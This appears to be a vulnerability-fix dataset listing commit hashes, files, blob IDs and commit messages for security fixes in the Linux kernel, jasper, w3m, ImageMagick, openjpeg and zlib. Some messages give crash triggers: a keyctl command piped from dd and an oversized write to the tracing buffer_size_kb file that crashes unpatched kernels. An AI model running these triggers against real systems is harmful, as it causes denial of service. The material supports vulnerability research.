Commit Message for 7df3e59c3d1df4f87fe874c7956ef7a3d2f4d5fb:
KEYS: Sort out big_key initialisation\n\nbig_key has two separate initialisation functions, one that registers the key type and one that registers the crypto.  If the key type fails to register, there's no problem if the crypto registers successfully because there's no way to reach the crypto except through the key type.\n\nHowever, if the key type registers successfully but the crypto does not, big_key_rng and big_key_blkcipher may end up set to NULL - but the code neither checks for this nor unregisters the big key key type.\n\nFurthermore, since the key type is registered before the crypto, it is theoretically possible for the kernel to try adding a big_key before the crypto is set up, leading to the same effect.\n\nFix this by merging big_key_crypto_init() and big_key_init() and calling the resulting function late.  If they're going to be encrypted, we shouldn't be creating big_keys before we have the facilities to do the encryption available.  The key type registration is also moved after the crypto initialisation.\n\nThe fix also includes message printing on failure.\n\nIf the big_key type isn't correctly set up, simply doing:\n\n	dd if=/dev/zero bs=4096 count=1 | keyctl padd big_key a @s\n\nought to cause an oops.\n\nFixes: 13100a72f40f5748a04017e0ab3df4cf27c809ef ('Security: Keys: Big keys stored encrypted') Signed-off-by: David Howells <dhowells@redhat.com> cc: Peter Hlavaty <zer0mem@yahoo.com> cc: Kirill Marinushkin <k.marinushkin@gmail.com> cc: Artem Savkov <asavkov@redhat.com> cc: stable@vger.kernel.org Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    d91198abd00fc435a397fe6bad906a4c1748e9cf
File(s) In Commit: 
    src/libjasper/jpc/jpc_dec.c
Blob(s) In Commit: 
    4f24660ddeaa55145a0019f0be5142f08642d848
Blob(s) Before Fix: 
    d2f258e325d4a98f8508490729ae4abce47fc4e7
Projects:
    did-g_jasper
Commit Message for d91198abd00fc435a397fe6bad906a4c1748e9cf:
Fixed another integer overflow problem.

======================================================================
Commit With Fix: 
    f7038068550fba0e41e1d0c355787f1dcd5bf330
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Blob(s) Before Fix: 
    cf7199e53a1016355912595e0f415f27512df532
Projects:
    did-g_jasper
Commit Message for f7038068550fba0e41e1d0c355787f1dcd5bf330:
Added some missing sanity checks on the data in a SIZ marker segment.

======================================================================
Commit With Fix: 
    f7038068550fba0e41e1d0c355787f1dcd5bf330
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Blob(s) Before Fix: 
    cf7199e53a1016355912595e0f415f27512df532
Projects:
    did-g_jasper
Commit Message for f7038068550fba0e41e1d0c355787f1dcd5bf330:
Added some missing sanity checks on the data in a SIZ marker segment.

======================================================================
Commit With Fix: 
    f7038068550fba0e41e1d0c355787f1dcd5bf330
File(s) In Commit: 
    src/libjasper/jpc/jpc_cs.c
Blob(s) In Commit: 
    37cfa983d4dbb17692d9324ec1e4702168d8860f
Blob(s) Before Fix: 
    cf7199e53a1016355912595e0f415f27512df532
Projects:
    did-g_jasper
Commit Message for f7038068550fba0e41e1d0c355787f1dcd5bf330:
Added some missing sanity checks on the data in a SIZ marker segment.

======================================================================
Commit With Fix: 
    d43527cfa0dbb3ccefec4a6f7b32c1434739aa29
File(s) In Commit: 
    Str.c
Blob(s) In Commit: 
    d34129fcbed971f92fc7ab91ff1ebad8bacab908
Blob(s) Before Fix: 
    70e99570d6fe91c2b5f1e69aba2a8a2e815ae72d
Projects:
    ii0_w3m
Commit Message for d43527cfa0dbb3ccefec4a6f7b32c1434739aa29:
Merge pull request #27 from kcwu/fix-strgrow\n\nFix potential heap buffer corruption due to Strgrow

======================================================================
Commit With Fix: 
    bf911e985d6bbaa328c20c3e05f4eb03de11fdd6
File(s) In Commit: 
    net/sctp/sm_statefuns.c
Blob(s) In Commit: 
    8ec20a64a3f8055a0c3576627c5ec5dad7e99ca8
Blob(s) Before Fix: 
    01b078172306a59e66e28883327942548c1baaf9
    026e3bca4a94bd34b418d5e6947f7182c1512358
    22c2bf367d7e8c7025065f33eabfd7e93a7f4021
    278c56a2d0765086f540c66d64ff151eaba9a155
    29c7c43de1086e79e1888bd9398f9b24d2b634a8
    2c244b29a199e70913c57c1a75b6054cf7c0850a
    3e287a3fa03b39e8e41a412911a768abef78fcae
    3ee27b7704ffb95430541507e83973e9207f9672
    5170a1ff95a1dba56ffafc30a9a4fdadf25ce1d4
    6f46aa16cb76963de27cb87e5e8cedf617a259a9
    891f5db8cc31c25f8a9412b6c8bb6dfdc114552f
    920469e7b0efba553f82d732b1b2e7a3394291db
    9fca103573508aa6f0880455e0e2c2d66dbb6150
    bfd0686797104a6f79a12ba06a64887ad6e8957d
    cd34a4a3406578954d5831b8304162c7102d8cec
    d7eaa7354cf76148d1a2c9ee3af4fff9a24990fb
    d88bb2b0b69913ad5962f9a5655d413f2c210ed0
    df938b2ab8480ca907f55dc68f13533389ea3851
    dfe3f36ff2aa27165b35a39d382583759cd3ebae
    e6bb98e583fb98c3d557efce9897c7b89cd3dbbc
    f1f08c8f277bd8719299d1ed21eb23e36d55f7e2
Projects:
    0-T-0_ps4-linux
Commit Message for bf911e985d6bbaa328c20c3e05f4eb03de11fdd6:
sctp: validate chunk len before actually using it\n\nAndrey Konovalov reported that KASAN detected that SCTP was using a slab beyond the boundaries. It was caused because when handling out of the blue packets in function sctp_sf_ootb() it was checking the chunk len only after already processing the first chunk, validating only for the 2nd and subsequent ones.\n\nThe fix is to just move the check upwards so it's also validated for the 1st chunk.\n\nReported-by: Andrey Konovalov <andreyknvl@google.com> Tested-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: Marcelo Ricardo Leitner <marcelo.leitner@gmail.com> Reviewed-by: Xin Long <lucien.xin@gmail.com> Acked-by: Neil Horman <nhorman@tuxdriver.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ce98a7acbcfca7f0a178f4b1e7b957e419e0cc99
File(s) In Commit: 
    coders/sgi.c
Blob(s) In Commit: 
    a0eebe97df822f4255b3778cb85654a0d95ff346
Blob(s) Before Fix: 
    6b0e9eb5a83bfbc6d6d826feddb582b732f89bf7
Projects:
    2016repotsheyue_ImageMagick
Commit Message for ce98a7acbcfca7f0a178f4b1e7b957e419e0cc99:
https://github.com/ImageMagick/ImageMagick/issues/301

======================================================================
Commit With Fix: 
    1abc2e5a401a4bf1d5ca4df91358ce5df111f495
File(s) In Commit: 
    src/libjasper/jpc/jpc_dec.c
Blob(s) In Commit: 
    1da54a79660fdf282eb86d9d96b9af11580ed728
Blob(s) Before Fix: 
    446dc59e129ea063771b5ce214dedecaa7dd7f52
Projects:
    did-g_jasper
Commit Message for 1abc2e5a401a4bf1d5ca4df91358ce5df111f495:
Fixed an array overflow problem in the JPC decoder.

======================================================================
Commit With Fix: 
    a0ac402cfcdc904f9772e1762b3fda112dcc56a0
File(s) In Commit: 
    block/blk-map.c
Blob(s) In Commit: 
    27fd8d92892d47e3478d9bcf3e1294a8eb28da89
Blob(s) Before Fix: 
    623e1cd4cffe997e71fbb54577bd42f220af64b3
    69953bd97e6597f684803b5064662a13abb8c65b
    779e07f8fc275077472d97db9f5d25b06a512ad6
    a54f0543b956e5ccf5f20206e7983fe66ce2698d
    a8b4f526d8bb22a7ab1fca78b7fb1d12e5a5da64
    ae4ae1047fd99575473a8b251dff562a151f0719
    b8657fa8dc9af7b2f5fe7958693df063cc4c9019
    b8d2725324a6b88391db4c8a5daf7a9c1309dd86
    b9f88b7751fbd87742b1d1439a1d89c97818f9ce
    ca1e10929df1480f19258fe98f7222cc9def88d9
    da310a1054299720d1b809d4ac3fd27af02b1e19
    f565e11f465aa145120973bce58ef7ecc192f349
    f7b22bc215180d4b7f467135faeaf52975a77013
    f890d4345b0cb63f9faa88e70d466a3cec3e6b3f
Projects:
    0-T-0_ps4-linux
Commit Message for a0ac402cfcdc904f9772e1762b3fda112dcc56a0:
Don't feed anything but regular iovec's to blk_rq_map_user_iov\n\nIn theory we could map other things, but there's a reason that function is called "user_iov".  Using anything else (like splice can do) just confuses it.\n\nReported-and-tested-by: Johannes Thumshirn <jthumshirn@suse.de> Cc: Al Viro <viro@ZenIV.linux.org.uk> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    cadff5fb6e73398de26a92e96d3d7cac893af255
File(s) In Commit: 
    src/bin/jp2/converttif.c
Blob(s) In Commit: 
    c690f8bfd25a512117489ff5acfdc729900e82b6
Blob(s) Before Fix: 
    143d3be6ff635c3adc21c2b9ca8321fff7ef0802
Projects:
    01bui_openjpeg
Commit Message for cadff5fb6e73398de26a92e96d3d7cac893af255:
These changes repair bugs of #871 and #872

======================================================================
Commit With Fix: 
    cadff5fb6e73398de26a92e96d3d7cac893af255
File(s) In Commit: 
    src/bin/jp2/converttif.c
Blob(s) In Commit: 
    c690f8bfd25a512117489ff5acfdc729900e82b6
Blob(s) Before Fix: 
    143d3be6ff635c3adc21c2b9ca8321fff7ef0802
Projects:
    01bui_openjpeg
Commit Message for cadff5fb6e73398de26a92e96d3d7cac893af255:
These changes repair bugs of #871 and #872

======================================================================
Commit With Fix: 
    ef85b67385436ddc1998f45f1d6a210f935b3388
File(s) In Commit: 
    arch/x86/kvm/vmx.c
Blob(s) In Commit: 
    24db5fb6f575af27d3b61a67b15ce9996158ed8b
Blob(s) Before Fix: 
    3980da515fd0cc702b0569e4a49c328f991eaffb
    5382b82462fcba28fed9a5064776cfb527e8eaa3
    5e45c2731a5d60ba6a9adfc58841ca075cd90834
    7758680db20b78abbf35f1b263c5f9d8da33b5e1
    a45d8580f91e7e8459666d7c1f0076ab1803b821
    aae43c6f24721e748451aea69d9c138c4be58f61
    ae4f6d35d19c268315745741150dd6d1a7df5222
    c41d7ffdda5ae6fa061205885da0bd55027c3c1f
    cf1b16dbc98a90d4035a480362a549f299faf55f
    ee1c8a93871c551f9cddc93de56197806d0c0cfd
    fb93010beaa4df8b61fb4b654d889b1dcaa0990d
Projects:
    0-T-0_ps4-linux
Commit Message for ef85b67385436ddc1998f45f1d6a210f935b3388:
kvm: nVMX: Allow L1 to intercept software exceptions (#BP and #OF)\n\nWhen L2 exits to L0 due to "exception or NMI", software exceptions (#BP and #OF) for which L1 has requested an intercept should be handled by L1 rather than L0. Previously, only hardware exceptions were forwarded to L1.\n\nSigned-off-by: Jim Mattson <jmattson@google.com> Cc: stable@vger.kernel.org Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

======================================================================
Commit With Fix: 
    2e83b79b2d6c78bf1b4aa227938a214dcbddc83f
File(s) In Commit: 
    fs/xfs/xfs_attr_list.c
Blob(s) In Commit: 
    4fa14820e2e22b687ef852b81e1d6b9f9028caf3
Blob(s) Before Fix: 
    01db96f60cf05abf1f42e20252cdff4de0ebea0d
    0ef7c2ed3f8a8e30e260485ee130d1a3b008ea07
    25e76cd6c0533654f36dfe579145322a4f571cd9
    62db83ab6cbc5e45f7dc1527738897b653c98e0f
    65fb37a18e92316616967bc7465c4e36e3fa116f
    8f7e09d0d0f0d4ea0921938af264fa94baa78f30
    90e2eeb2120758e24c5bf466ca80f98b6129ef9e
    a43d370d2c5887c689844a66c787785fef608808
    a58034049995b4c6a7db190164ea886ec5113dff
    ae64625937e53beb1734a5246aff4f1980c42aa7
    c8be331a319679162e4a742c0f942552792bb8b6
    d25f26b22ac92821cb2dbc95973e0c1804cebe10
Projects:
    0-T-0_ps4-linux
Commit Message for 2e83b79b2d6c78bf1b4aa227938a214dcbddc83f:
xfs: fix two memory leaks in xfs_attr_list.c error paths\n\nThis plugs 2 trivial leaks in xfs_attr_shortform_list and xfs_attr3_leaf_list_int.\n\nSigned-off-by: Mateusz Guzik <mguzik@redhat.com> Cc: <stable@vger.kernel.org> Reviewed-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: Dave Chinner <david@fromorbit.com>\n\n

======================================================================
Commit With Fix: 
    59643d1535eb220668692a5359de22545af579f6
File(s) In Commit: 
    kernel/trace/ring_buffer.c
Blob(s) In Commit: 
    9c143739b8d73f0c7982be06eb0e5cdb902bfc81
Blob(s) Before Fix: 
    0315d43176d80d264c37f22ba403a5089a124c48
    2d75c94ae87d871bbf42db7b1ee949463bb7f65f
    3e1d11f4fe445abbb01329b5476c81e13581a522
    49491fa7daa2d35546a6e5ba46d73103594c384e
    5040d44fe5a3cf422bab79c1395e53703a394733
    5ddd763523ad22438d6bfa62fe65dbe03ba2710b
    6260717c18e3c6fb8eefa4cfcc185ab8322a6929
    75f1d05ea82dcce04e9f6a581f26969e503dc773
    774a0807fe811b103d4b80d33b284ef48ecd7fc4
    7c56c3d06943060d13ed611da638a09ccfa70ef4
    95181e36891a2b63f38083ec7b81439d589fdcfe
    99d64cd58c52d6ef8dc267423987736ce24d935b
    9c6045a27ba356252546971fb26dbae30149c89c
    a56e07c8d15b8b730eb54f2020a018ff440eec6c
    acbb0e73d3a215701574b0c67fce832c742d825e
    afb04b9b818a473f8b38e0aa94ee12ad84c44d1a
    b38fb2b9e23772d3f3360ef556cf0714d4a44803
    c2aad72761114880946da7ebbac8b521a121c33e
    c634868c2921ca39837c3a36773c36fa4a3273d5
    cc2f66f68dc579c7e93967e4306821df29d7adce
    cf8d11e91efdf92d95dad58d6fa771d2ac998786
    f4fbbfcdf399e3b09ec39205474c838ea8f9a55d
    f5b7b5c1195beaf806f19d59e0ce7114c0e36add
    f5c016e8fc884e2374b369bac9de2dd79798f332
    fc347f8b1bca24debb823cdeca09424368c16e2e
    fc4da2d97f9b6e280b2e29a525e478958cb495d4
Projects:
    0-T-0_ps4-linux
Commit Message for 59643d1535eb220668692a5359de22545af579f6:
ring-buffer: Prevent overflow of size in ring_buffer_resize()\n\nIf the size passed to ring_buffer_resize() is greater than MAX_LONG - BUF_PAGE_SIZE then the DIV_ROUND_UP() will return zero.\n\nHere's the details:\n\n  # echo 18014398509481980 > /sys/kernel/debug/tracing/buffer_size_kb\n\ntracing_entries_write() processes this and converts kb to bytes.\n\n 18014398509481980 << 10 = 18446744073709547520\n\nand this is passed to ring_buffer_resize() as unsigned long size.\n\n size = DIV_ROUND_UP(size, BUF_PAGE_SIZE) \n\nWhere DIV_ROUND_UP(a, b) is (a + b - 1)/b\n\nBUF_PAGE_SIZE is 4080 and here\n\n 18446744073709547520 + 4080 - 1 = 18446744073709551599\n\nwhere 18446744073709551599 is still smaller than 2^64\n\n 2^64 - 18446744073709551599 = 17\n\nBut now 18446744073709551599 / 4080 = 4521260802379792\n\nand size = size * 4080 = 18446744073709551360\n\nThis is checked to make sure its still greater than 2 * 4080, which it is.\n\nThen we convert to the number of buffer pages needed.\n\n nr_page = DIV_ROUND_UP(size, BUF_PAGE_SIZE)\n\nbut this time size is 18446744073709551360 and\n\n 2^64 - (18446744073709551360 + 4080 - 1) = -3823\n\nThus it overflows and the resulting number is less than 4080, which makes\n\n  3823 / 4080 = 0\n\nan nr_pages is set to this. As we already checked against the minimum that nr_pages may be, this causes the logic to fail as well, and we crash the kernel.\n\nThere's no reason to have the two DIV_ROUND_UP() (that's just result of historical code changes), clean up the code and fix this bug.\n\nCc: stable@vger.kernel.org # 3.5+ Fixes: 83f40318dab00 ("ring-buffer: Make removal of ring buffer pages atomic") Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    2117d5398c81554fbf803f5fd1dc55eb78216c0c
File(s) In Commit: 
    arch/x86/kvm/emulate.c
Blob(s) In Commit: 
    a3ce9d260d68756fa675ce40994b79aedd206413
Blob(s) Before Fix: 
    106c01557f2b63706eca28e462a3b072b590f0c5
    1505587d06e97826703b21aba540ea8403bd8f2c
    205b17eed93c2bfa0d402414a29bac9ed4fb3e5f
    38d3751472e451fec11a65552fff180d38e5a085
    4e95d3eb29557bcb99219fddb7b909e23ff3b090
    a2f24af3c999ca5f14c553bf5e9875725c47668a
    a3b57a27be880649ac7b0ae4144bc62faf105cbc
    b9b09fec173bf2fedb0b9ee122b3c4668eb6e471
    cbd7b92585bbbaabad95811f2a139e24283a4c35
    ddc3f3d2afdb155b3ce39f4049c800356fb42d04
    de36660751b5bceb72b2180c0f720f425fc71386
    f49e98062ea5cbda4fb52c38de06f42b310e711b
Projects:
    0-T-0_ps4-linux
Commit Message for 2117d5398c81554fbf803f5fd1dc55eb78216c0c:
KVM: x86: drop error recovery in em_jmp_far and em_ret_far\n\nem_jmp_far and em_ret_far assumed that setting IP can only fail in 64 bit mode, but syzkaller proved otherwise (and SDM agrees). Code segment was restored upon failure, but it was left uninitialized outside of long mode, which could lead to a leak of host kernel stack. We could have fixed that by always saving and restoring the CS, but we take a simpler approach and just break any guest that manages to fail as the error recovery is error-prone and modern CPUs don't need emulator for this.\n\nFound by syzkaller:\n\n  WARNING: CPU: 2 PID: 3668 at arch/x86/kvm/emulate.c:2217 em_ret_far+0x428/0x480   Kernel panic - not syncing: panic_on_warn set ...\n\n  CPU: 2 PID: 3668 Comm: syz-executor Not tainted 4.9.0-rc4+ #49   Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Bochs 01/01/2011    [...]   Call Trace:    [...] __dump_stack lib/dump_stack.c:15    [...] dump_stack+0xb3/0x118 lib/dump_stack.c:51    [...] panic+0x1b7/0x3a3 kernel/panic.c:179    [...] __warn+0x1c4/0x1e0 kernel/panic.c:542    [...] warn_slowpath_null+0x2c/0x40 kernel/panic.c:585    [...] em_ret_far+0x428/0x480 arch/x86/kvm/emulate.c:2217    [...] em_ret_far_imm+0x17/0x70 arch/x86/kvm/emulate.c:2227    [...] x86_emulate_insn+0x87a/0x3730 arch/x86/kvm/emulate.c:5294    [...] x86_emulate_instruction+0x520/0x1ba0 arch/x86/kvm/x86.c:5545    [...] emulate_instruction arch/x86/include/asm/kvm_host.h:1116    [...] complete_emulated_io arch/x86/kvm/x86.c:6870    [...] complete_emulated_mmio+0x4e9/0x710 arch/x86/kvm/x86.c:6934    [...] kvm_arch_vcpu_ioctl_run+0x3b7a/0x5a90 arch/x86/kvm/x86.c:6978    [...] kvm_vcpu_ioctl+0x61e/0xdd0 arch/x86/kvm/../../../virt/kvm/kvm_main.c:2557    [...] vfs_ioctl fs/ioctl.c:43    [...] do_vfs_ioctl+0x18c/0x1040 fs/ioctl.c:679    [...] SYSC_ioctl fs/ioctl.c:694    [...] SyS_ioctl+0x8f/0xc0 fs/ioctl.c:685    [...] entry_SYSCALL_64_fastpath+0x1f/0xc2\n\nReported-by: Dmitry Vyukov <dvyukov@google.com> Cc: stable@vger.kernel.org Fixes: d1442d85cc30 ("KVM: x86: Handle errors when RIP is set during far jumps") Signed-off-by: Radim Krčmář <rkrcmar@redhat.com>

======================================================================
Commit With Fix: 
    b98b0bc8c431e3ceb4b26b0dfc8db509518fb290
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    00a074dbfe9bf169c2b81498e6ae265199745b22
Blob(s) Before Fix: 
    08bf97eceeb3827d0b237d8c01910e5e0a0f5d6a
    0b39e7ae43837e602ff473b641675fbf22b83b5c
    0d91f7dca751efc3e32348ba217c29e8ed55e80b
    10acaccca5c8c3466f6ceb0827a8375fc9d30b66
    1989b3dd6d17c7613c6c333912f87c721b22826f
    1e4dd54bfb5a525ef6070905f07472f60e9f137f
    25dab8b60223e25ee92dae45a226fce2a6bb5a03
    45f447c7ed3ef5708a9f1d96003bd433a69fe799
    5e3ca414357e2404db28eeacc5e9306051161493
    629ab4a5b45b5a0c45b100752080fc9a4d816980
    664ee4295b6f6ec38fb4f89d11c52eaa383a15d1
    6c1c8bc934127c48bb5e0a95961e61c5b79da5b4
    71e3e5f1eaa04816b8bdd1d34b4fd575f19793b9
    7e73c26b6bb468c071339ba60127ce20d59073ee
    a6000fbad2949f58a079322f4e328e0c051df896
    ba27920b6bbcc27d6cb5a2d645ba2eaa35b3f826
    c73e28fc9c2a45225af39f7905072456d4380c7f
    f4c0917e66b5f8cad1cec9a7b93e84b67cfe1006
    fd7b41edf1cec86e0ae464ec93bee25a43721afe
Projects:
    0-T-0_ps4-linux
Commit Message for b98b0bc8c431e3ceb4b26b0dfc8db509518fb290:
net: avoid signed overflows for SO_{SND|RCV}BUFFORCE\n\nCAP_NET_ADMIN users should not be allowed to set negative sk_sndbuf or sk_rcvbuf values, as it can lead to various memory corruptions, crashes, OOM...\n\nNote that before commit 82981930125a ("net: cleanups in sock_setsockopt()"), the bug was even more serious, since SO_SNDBUF and SO_RCVBUF were vulnerable.\n\nThis needs to be backported to all known linux kernels.\n\nAgain, many thanks to syzkaller team for discovering this gem.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com> Reported-by: Andrey Konovalov <andreyknvl@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3aa02cb664c5fb1042958c8d1aa8c35055a2ebc4
File(s) In Commit: 
    sound/core/pcm_lib.c
Blob(s) In Commit: 
    0aca39762ed0ec981fb4f612741010a255a97587
Blob(s) Before Fix: 
    3420bd3da5d70ffec570e058d84b20f39aab49b8
    3a9b66c6e09c38933b63a4af6ee20e34efa09118
    4c145d6bccd4ddbe02f5626e85c8589ca7f982ff
    6b5a811e01a544f3379829b8ebfa3773904691bb
    7d45645f10ba99e33b54b3218559778db3aca36a
    dfed3ef024751afca34231513fec36565258b950
    ffd656012ab8cf123faef551c9eaaae48c2beb8c
Projects:
    0-T-0_ps4-linux
Commit Message for 3aa02cb664c5fb1042958c8d1aa8c35055a2ebc4:
ALSA: pcm : Call kill_fasync() in stream lock\n\nCurrently kill_fasync() is called outside the stream lock in snd_pcm_period_elapsed().  This is potentially racy, since the stream may get released even during the irq handler is running.  Although snd_pcm_release_substream() calls snd_pcm_drop(), this doesn't guarantee that the irq handler finishes, thus the kill_fasync() call outside the stream spin lock may be invoked after the substream is detached, as recently reported by KASAN.\n\nAs a quick workaround, move kill_fasync() call inside the stream lock.  The fasync is rarely used interface, so this shouldn't have a big impact from the performance POV.\n\nIdeally, we should implement some sync mechanism for the proper finish of stream and irq handler.  But this oneliner should suffice for most cases, so far.\n\nReported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    92964c79b357efd980812c4de5c1fd2ec8bb5520
File(s) In Commit: 
    net/netlink/af_netlink.c
Blob(s) In Commit: 
    627f898c05b96552318a881ce995ccc3342e1576
Blob(s) Before Fix: 
    0007b818039708bf447d74252712d93f9a8889e0
    04748ab649c25bbb2d2d7cee6fbc192fb267dfbc
    05919bf3f670ed1267e01f14c1de61e78e4d80c4
    15c731f03fa664a64f7bf3cdde36cf1a8e4150b6
    15e6e7b9fd2bd2cb6db4caf7afa38665af38e708
    215fc08c02ab5508374b08ba9dcefc44e8d0875b
    2702673f0f237d7fa43e4649ccc0672f67c895bc
    330ebd600f254d53e23a174273a504e395c0e7cf
    4f46daedaf420bcd4a2df6dd62eaa221d2ed8c20
    59651af8cc2705b39f3ad1ea71ab0b161668af02
    79c965a51ab231541091d0c3a8740d508b1faaa4
    81dc1bb6e0168ed17cd2d60e6dc3a394f0f34e76
    8f060d7f9a0e107a410d3ffe71722f49059f7bc8
    aeefe127691a8f14f132a5c6db8ad3e8a68d546a
    bca50b95c182300cbd89f8cfc21b17e9d6e31fe2
    bf6e76643f7876d8dee4df261baf077aad837be3
    c416725d28c49f8b0c1b10bbf35a28594c646bc5
    c8416792cce0bed9bedcd18f15aa7c2278afa3de
    dea925388a5b7a86ba649f888fb10bb805f54edb
    e7b39363cae778195d4e347bf497561e309fd9f2
    ec4adbdcb9b4a9926b4d992906f51787c57dc6a2
    f1ffb34e253f4906275d4da99ce26306b94241eb
    f22757a29cd054e02e40372535a6407735a12ddc
    f48e3b3aedd539abb634c06b2f0d9945a127228d
Projects:
    0-T-0_ps4-linux
Commit Message for 92964c79b357efd980812c4de5c1fd2ec8bb5520:
netlink: Fix dump skb leak/double free\n\nWhen we free cb->skb after a dump, we do it after releasing the lock.  This means that a new dump could have started in the time being and we'll end up freeing their skb instead of ours.\n\nThis patch saves the skb and module before we unlock so we free the right memory.\n\nFixes: 16b304f3404f ("netlink: Eliminate kmalloc in netlink dump operation.") Reported-by: Baozeng Ding <sploving1@gmail.com> Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au> Acked-by: Cong Wang <xiyou.wangcong@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6a043145ca6e9c55184013841a67b2fef87e44c0
File(s) In Commit: 
    inftrees.c
Blob(s) In Commit: 
    0d2670d57c8cbe70d4bd8586f193d0608dd14749
Blob(s) Before Fix: 
    22fcd6666d4042ccd78d40f90dfad8636a517557
    44d89cf24e1c2aa20c3b4f0e68bff0d15ae3a5d7
    aa9a6da37242d06c9be663a5481147731e26120f
Projects:
    0xXA_lk
Commit Message for 6a043145ca6e9c55184013841a67b2fef87e44c0:
Remove offset pointer optimization in inftrees.c.\n\ninftrees.c was subtracting an offset from a pointer to an array, in order to provide a pointer that allowed indexing starting at the offset. This is not compliant with the C standard, for which the behavior of a pointer decremented before its allocated memory is undefined. Per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this tiny optimization was removed, in order to avoid the possibility of undefined behavior.

======================================================================
Commit With Fix: 
    9aaec95e82117c1cb0f9624264c3618fc380cecb
File(s) In Commit: 
    inffast.c
Blob(s) In Commit: 
    f0d163db805fa8cd265547ce95181cc2e279343a
Blob(s) Before Fix: 
    bda59ceb6a12b2d7de80ef3c1e7318e54fc979ac
Projects:
    0xXA_lk
Commit Message for 9aaec95e82117c1cb0f9624264c3618fc380cecb:
Use post-increment only in inffast.c.\n\nAn old inffast.c optimization turns out to not be optimal anymore with modern compilers, and furthermore was not compliant with the C standard, for which decrementing a pointer before its allocated memory is undefined. Per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this "optimization" was removed, in order to avoid the possibility of undefined behavior.

======================================================================
Commit With Fix: 
    e54e1299404101a5a9d0cf5e45512b543967f958
File(s) In Commit: 
    inflate.c
Blob(s) In Commit: 
    a71841670eff6476d3b86a49dcf91acdf2e7bb3f
Blob(s) Before Fix: 
    18deb4792400d5565679fd5fd5c422c1e72cc84f
    2889e3a07d6d425946fc807f0be6b9156ecc1444
    4fd3f3c1809b49b3e223a3f4f5698fd097ebb287
Projects:
    0xXA_lk
Commit Message for e54e1299404101a5a9d0cf5e45512b543967f958:
Avoid shifts of negative values inflateMark().\n\nThe C standard says that bit shifts of negative integers is undefined.  This casts to unsigned values to assure a known result.

======================================================================
Commit With Fix: 
    d1d577490c15a0c6862473d7576352a9f18ef811
File(s) In Commit: 
    crc32.c
Blob(s) In Commit: 
    05733f4e407580307a53317978beba2281c006d1
Blob(s) Before Fix: 
    979a7190a3ca44c66797f6f994804f825bf82d4a
Projects:
    0xXA_lk
Commit Message for d1d577490c15a0c6862473d7576352a9f18ef811:
Avoid pre-decrement of pointer in big-endian CRC calculation.\n\nThere was a small optimization for PowerPCs to pre-increment a pointer when accessing a word, instead of post-incrementing. This required prefacing the loop with a decrement of the pointer, possibly pointing before the object passed. This is not compliant with the C standard, for which decrementing a pointer before its allocated memory is undefined. When tested on a modern PowerPC with a modern compiler, the optimization no longer has any effect. Due to all that, and per the recommendation of a security audit of the zlib code by Trail of Bits and TrustInSoft, in support of the Mozilla Foundation, this "optimization" was removed, in order to avoid the possibility of undefined behavior.

======================================================================
Commit With Fix: 
    79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2
File(s) In Commit: 
    net/ipv6/icmp.c
Blob(s) In Commit: 
    2772004ba5a18848bd818434951fb10d758be90d
Blob(s) Before Fix: 
    0013cacf7164c6eec1816b8bd0d08ca01dc7e81d
    01d46bff63c312b7804c8132d6860a1a749eb043
    0a37ddc7af51579f56b644ba0e4c3c3a7a2e2bc7
    24d69dbca4d68e2f1d1444796cb3d5c33b0a1fe2
    2c2b5d51f15cd24b7c1a5b9a416bbfd33201ec06
    36c5a98b04727b220e9ea77e00d96410d4bb3f74
    375b4b4f9bf5dde6fee9f4fc2a9028738498504e
    4527285fcaa2c2c8134c089b88e0cfeeeddad292
    50585ad317d1351e1cf84081a97c9a7dd80fa18c
    7370ad2e693a33d7db78c311c7e47c001c80df7c
    7b326529e6a2cba57695697cfff436357c347b2c
    87b9082ceab27367e6415e41b26f0c0417cfaa61
    8d7b113958b1332be11545069fafa8072a64e6a2
    a4fa840769690a271b259aee1630fb061bf0ae92
    a5e95199585ecb55bf63bbf02d2d34cacfbcca48
    bd59c343d35f297ff6c0462cac4cc76c6c9b76ed
    c5f2b17b7ee1a70d9acb13931de0c1e4e1a4c96b
    d78f3bd945d74c18537d6a23408cbf8c2f279eca
    eef8d945b362cf698c9ee407acec38f40e69977d
    f6c84a6eb2389c55f4abd55fefbd073c73743a2a
Projects:
    0-T-0_ps4-linux
Commit Message for 79dc7e3f1cd323be4c81aa1a94faa1b3ed987fb2:
